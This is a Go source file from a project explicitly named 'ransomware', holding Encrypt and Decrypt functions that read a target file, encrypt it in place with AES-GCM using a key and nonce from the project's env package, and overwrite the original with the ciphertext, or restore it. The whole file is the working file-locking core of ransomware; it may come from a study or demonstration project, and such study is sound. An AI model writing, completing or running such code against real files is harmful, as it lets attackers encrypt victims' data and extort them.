package actions

import (
	"crypto/rand"
	"io"
	"log"
	"os"
	u "ransomware/_utils"
	"ransomware/env"
)

func Encrypt(fileName string) {
	file, err := os.ReadFile(fileName)
	u.HandleError(err)

	if _, err := io.ReadFull(rand.Reader, env.Nouce); err != nil {
		panic(err)
	}

	cipherText := env.Gcm.Seal(env.Nouce, env.Nouce, file, nil)

	log.Printf("Encrypting %s", fileName)

	if err := os.WriteFile(fileName, cipherText, 0777); err != nil {
		panic(err)
	}

}

func Decrypt(fileName string) {
	file, err := os.ReadFile(fileName)
	u.HandleError(err)

	nouce := file[:env.Gcm.NonceSize()]
	file = file[env.Gcm.NonceSize():]

	plainText, err := env.Gcm.Open(nil, nouce, file, nil)

	if err != nil {
		log.Printf("Error to open file: %s", err)
		return
	}

	log.Printf("Decrypting %s", fileName)

	if err := os.WriteFile(fileName, plainText, 0777); err != nil {
		panic(err)
	}

}
